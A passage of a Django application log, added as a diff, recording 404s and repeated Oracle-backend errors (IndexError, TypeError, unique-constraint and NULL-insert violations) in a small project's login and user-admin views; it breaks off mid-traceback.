@@ -1,0 +1,2301 @@
+2019-01-24 10:27:42,222 [Thread-3:34112] [django.request:152] [base:get_response] [WARNING]- Not Found: /favicon.ico
+2019-01-24 10:30:45,324 [Thread-8:30452] [django.request:152] [base:get_response] [WARNING]- Not Found: /favicon.ico
+2019-01-24 11:21:34,018 [Thread-4:31520] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 66, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 29, in loginmark
+    uid = userinfo.objects.filter(username=ausername).values()[0]['userid']
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 289, in __getitem__
+    return list(qs)[0]
+IndexError: list index out of range
+2019-01-24 14:28:29,578 [Thread-3:34276] [django.request:152] [base:get_response] [WARNING]- Not Found: /favicon.ico
+2019-01-24 15:29:03,369 [Thread-3:7160] [django.request:152] [base:get_response] [WARNING]- Not Found: /favicon.ico
+2019-01-24 15:29:06,126 [Thread-4:36260] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 66, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 30, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:29:16,721 [Thread-6:37440] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 66, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 30, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:31:11,781 [Thread-3:35892] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 67, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 31, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:31:48,040 [Thread-3:24636] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 67, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 31, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:32:35,012 [Thread-8:34636] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 65, in execute
+    return self.cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\base.py", line 479, in execute
+    return self.cursor.execute(query, self._param_generator(params))
+cx_Oracle.IntegrityError: ORA-00001: unique constraint (SCOTT.SYS_C0012212) violated
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 89, in admin
+    data = adminadd(username, usercode, usertype)
+  File "D:\stealproject\web\django2\django2\views.py", line 37, in adminadd
+    userinfo.objects.create(userid=k+1,username=ausername, password=busercode, type=cusertype)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1099, in execute_sql
+    cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 80, in execute
+    return super(CursorDebugWrapper, self).execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 65, in execute
+    return self.cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\utils.py", line 94, in __exit__
+    six.reraise(dj_exc_type, dj_exc_value, traceback)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\utils\six.py", line 685, in reraise
+    raise value.with_traceback(tb)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 65, in execute
+    return self.cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\base.py", line 479, in execute
+    return self.cursor.execute(query, self._param_generator(params))
+django.db.utils.IntegrityError: ORA-00001: unique constraint (SCOTT.SYS_C0012212) violated
+2019-01-24 15:33:14,038 [Thread-3:37056] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 67, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 31, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:38:04,951 [Thread-3:35832] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 67, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 31, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:39:49,792 [Thread-6:38592] [django.request:152] [base:get_response] [WARNING]- Not Found: /favicon.ico
+2019-01-24 15:39:51,838 [Thread-7:38812] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 67, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 31, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:40:47,969 [Thread-3:11204] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 65, in execute
+    return self.cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\base.py", line 479, in execute
+    return self.cursor.execute(query, self._param_generator(params))
+cx_Oracle.IntegrityError: ORA-01400: cannot insert NULL into ("SCOTT"."DJANGO2_LOGINHISTORY"."USERID")
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 67, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 31, in loginmark
+    loginhistory.objects.create(username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1099, in execute_sql
+    cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 80, in execute
+    return super(CursorDebugWrapper, self).execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 65, in execute
+    return self.cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\utils.py", line 94, in __exit__
+    six.reraise(dj_exc_type, dj_exc_value, traceback)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\utils\six.py", line 685, in reraise
+    raise value.with_traceback(tb)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\utils.py", line 65, in execute
+    return self.cursor.execute(sql, params)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\base.py", line 479, in execute
+    return self.cursor.execute(query, self._param_generator(params))
+django.db.utils.IntegrityError: ORA-01400: cannot insert NULL into ("SCOTT"."DJANGO2_LOGINHISTORY"."USERID")
+2019-01-24 15:41:08,029 [Thread-3:35216] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 67, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 31, in loginmark
+    loginhistory.objects.create(userid=uid)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
